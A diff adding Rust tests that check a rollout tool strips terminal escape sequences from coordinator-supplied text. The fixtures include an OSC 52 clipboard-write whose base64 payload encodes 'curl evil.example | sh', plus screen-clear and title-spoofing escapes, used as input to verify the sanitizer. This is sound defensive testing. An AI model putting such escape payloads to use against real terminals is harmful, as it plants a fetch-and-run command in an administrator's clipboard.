@@ -795,3 +795,120 @@ fn status_is_one_line_per_machine_and_says_what_to_do() {
     let lines = rollout_lines(&refused, now);
     assert!(lines[0] == ("release 7 was refused: bad signature".to_string(), true) && lines.len() == 2, "{lines:?}");
 }
+
+// ---- the coordinator's words on the admin's terminal ----
+
+/// What a hacked registry account can put in the rollout copy the desktop
+/// reads: an OSC 52 that writes the admin's clipboard, a screen clear and
+/// a window title. `release status` prints none of it.
+#[test]
+fn review_release_status_prints_no_control_characters() {
+    let now = 1_795_400_000;
+    let seen = Time(chrono::DateTime::from_timestamp(now, 0).unwrap());
+    let m = Member { host: 2, name: "node-a".into(), report: Some(Report::default()), last_seen: seen, ..Member::default() };
+    let rollout = Rollout {
+        serial: 10,
+        phase: Phase::Servers,
+        skipped: vec![Skip { host: 2, name: "node-a".into(), why: "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07".into() }],
+        paused: "stopped".into(),
+        pause: Pause::Failed,
+        pause_host: 3,
+        pause_name: "\x1b[2J\x1b]0;pwned\x07".into(),
+        ..Rollout::default()
+    };
+    let v = View { members: vec![(m, true)], rollout, coordinator_now: now, ..View::default() };
+    let bad: Vec<String> = status_lines(&v, now).into_iter().filter(|l| l.chars().any(|c| c.is_control())).collect();
+    assert!(bad.is_empty(), "{bad:?}");
+    // The name that is not a hostname is not shown at all.
+    let text = status_lines(&v, now).join("\n");
+    assert!(text.contains("the coordinator gives the server its turn again") && !text.contains("pwned"), "{text}");
+    assert!(!resume_does(&v.rollout).unwrap().contains('\x1b') && !skip_does(&v.rollout).unwrap().contains('\x1b'));
+    assert!(!stopped_keys(&v.rollout).unwrap().chars().any(|c| c.is_control()));
+}
+
+/// Every text of the rollout as the desktop takes it is printable ASCII
+/// and cut short, names that are not hostnames are gone, the lists are
+/// capped (the newest warnings kept); numbers and plain words stay.
+#[test]
+fn a_rollout_from_the_coordinator_is_made_plain() {
+    let evil = "a\x1b]52;c;eA==\x07\u{9b}2J\u{202e}\r\n";
+    let r = Rollout {
+        serial: 7,
+        phase: Phase::Servers,
+        turn: Some(Turn { host: 4, name: "node-c\x1b[2J".into(), since: 5, ready: true, ..Turn::default() }),
+        skipped: (0..100)
+            .map(|h| Skip { host: h, name: if h == 0 { "node-a".into() } else { evil.into() }, why: evil.repeat(100) })
+            .collect(),
+        cordoned: vec!["node-b".into(), evil.into(), "-bad".into()],
+        paused: evil.into(),
+        pause: Pause::Drain,
+        pause_host: 3,
+        pause_name: "Node-B".into(),
+        warnings: (0..100).map(|i| format!("w{i} {evil}")).collect(),
+        refused: evil.repeat(100),
+        done: vec![2, 3],
+        resume_asked: 4,
+        ..Rollout::default()
+    };
+    let s = r.clone().sanitized();
+    let plain = |t: &str| t.chars().all(|c| (' '..='~').contains(&c));
+    assert_eq!(s.turn.as_ref().map(|t| (t.host, t.name.as_str(), t.ready)), Some((4, "", true)));
+    assert_eq!(s.skipped.len(), MAX_SHOWN);
+    assert_eq!((s.skipped[0].host, s.skipped[0].name.as_str(), s.skipped[1].name.as_str()), (0, "node-a", ""));
+    assert!(s.skipped.iter().all(|k| plain(&k.why) && k.why.len() == 200));
+    assert_eq!(s.cordoned, vec!["node-b".to_string()]);
+    assert_eq!(s.paused, "a?]52;c;eA==??2J???");
+    assert_eq!(s.pause_name, "", "not a hostname");
+    assert_eq!(s.warnings.len(), MAX_SHOWN);
+    assert!(s.warnings[0].starts_with("w36 ") && s.warnings.iter().all(|w| plain(w)), "the newest are kept");
+    assert!(plain(&s.refused) && s.refused.len() == 300);
+    assert_eq!(
+        (s.serial, s.phase, s.pause, s.pause_host, s.done.clone(), s.resume_asked),
+        (7, Phase::Servers, Pause::Drain, 3, vec![2, 3], 4)
+    );
+    assert_eq!(s.clone().sanitized(), s, "once is enough");
+    // What a sane coordinator sends goes through as it is.
+    let fine = Rollout {
+        serial: 7,
+        skipped: vec![Skip { host: 2, name: "node-a".into(), why: "it refused the release".into() }],
+        paused: "node-b: update failed: no space left on device".into(),
+        pause_name: "node-b".into(),
+        warnings: vec!["draining node-c timed out".into()],
+        ..Rollout::default()
+    };
+    assert_eq!(fine.clone().sanitized(), fine);
+}
+
+/// The desktop's load cuts the rollout down before anything shows it, and
+/// the cuts a member reports show only hostnames.
+#[test]
+fn a_load_takes_the_rollout_and_the_cuts_as_plain_text() {
+    let dir = TempDir::new();
+    let (mut a, store, _, _, _) = desk(&dir);
+    store
+        .update(|s| {
+            s.rollout = Rollout {
+                serial: 5,
+                phase: Phase::Servers,
+                paused: "\x1b]52;c;Y3VybA==\x07stopped".into(),
+                pause: Pause::Failed,
+                pause_host: 2,
+                pause_name: "\x1b[2J".into(),
+                warnings: vec!["\x1b]0;pwned\x07".into()],
+                ..Rollout::default()
+            };
+            let m = s.members.iter_mut().find(|m| m.host == 2).unwrap();
+            m.cuts = vec![
+                crate::registry::CutReport { name: "node-b".into(), auto: true },
+                crate::registry::CutReport { name: "x\x1b[2J".into(), auto: false },
+            ];
+            Ok(())
+        })
+        .unwrap();
+    let v = a.load().unwrap();
+    assert_eq!((v.rollout.paused.as_str(), v.rollout.pause_name.as_str()), ("?]52;c;Y3VybA==?stopped", ""));
+    assert_eq!(v.rollout.warnings, vec!["?]0;pwned?".to_string()]);
+    assert_eq!(v.reports.len(), 1, "{:?}", v.reports);
+    assert!(v.reports[0].starts_with("node-a cut off node-b by itself"), "{:?}", v.reports);
+    assert_eq!(resume(&mut a).unwrap(), "gives the server its turn again, to try release 5 once more");
+}
